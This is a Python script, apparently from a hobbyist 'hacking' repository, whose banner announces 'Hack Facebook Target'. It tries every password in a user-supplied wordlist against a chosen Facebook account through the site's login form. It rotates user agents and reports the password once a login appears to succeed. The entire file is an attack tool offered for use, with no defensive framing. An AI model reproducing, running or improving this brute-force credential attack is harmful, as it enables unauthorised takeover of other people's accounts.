# -*- coding: utf-8 -*-
import os
import sys
import time
import random

try:
    import mechanize
except ImportError:
    print("Error: 'mechanize' module not found. Install with: pip install mechanize")
    sys.exit(1)

# Compatibility for input
try:
    input = raw_input  # Python 2
except NameError:
    pass  # Python 3

# Clear screen
os.system('clear' if 'linux' in sys.platform else 'cls')

def loading():
    for i in range(100):
        sys.stdout.write('\r' + '.' * i)
        sys.stdout.flush()
        time.sleep(0.01)
    os.system('clear' if 'linux' in sys.platform else 'cls')

def banner():
    print('''
    
    
    
     █████████████████████████████████████████
      [-_-] HELLO IDIOT [-_-]
      █████████████████████████████████████████
     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
      █████████████████████████████████████████
       AUTHOR : Riski Darmawan
       GITHUB : https://github.com/FR13ND8
    ███████████████████████████████████████████
       WHATSAPP : 085835787069
    ███████████████████████████████████████████
   FUNCTION : Hack Facebook Target
    ███████████████████████████████████████████
   >> DON'T RECODE, YOU IDIOT
   I WORKED HARD MAKING THIS, IDIOT
    ███████████████████████████████████████████
    ''')
    time.sleep(1)

def brute(password):
    global target
    try:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-agent', random.choice(user_agents))]
        
        br.open('https://www.facebook.com/login.php?login_attempt=1')
        br.select_form(nr=0)
        br.form['email'] = target
        br.form['pass'] = password
        br.submit()
        url_after = br.geturl()

        if url_after != target and 'login_attempt' not in url_after:
            print(f'\n\n[+] \033[97;1mTHIS IS THE PASSWORD\033[31;1m ===> \033[96;1m{password}')
            input('......PRESS ENTER TO EXIT.....')
            sys.exit()
    except:
        pass

def main():
    banner()
    global target
    target = input('[?] Enter Target ID : ').strip()
    wordlist = input('TYPE password.txt : ').strip()

    try:
        with open(wordlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        print('SORRY, PASSWORD NOT FOUND')
        print('MAKE A NEW password/Wordlist')
        input('......PRESS ENTER TO EXIT.....')
        sys.exit()

    print(f'[+] Account to crack : {target}')
    print(f'[+] WORDLIST COUNT   : {len(passwords)}')
    print('[*] CRACKING IN PROGRESS, PLEASE WAIT .....\n')

    for pwd in passwords:
        time.sleep(0.3)
        print(f'[+] Trying..... {pwd}')
        brute(pwd)

    print('SORRY, PASSWORD NOT FOUND')
    print('MAKE A NEW password/Wordlist')
    input('......PRESS ENTER TO EXIT.....')

# User Agents
user_agents = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/20080725 Firefox/3.0.1'
]

if __name__ == '__main__':
    main()
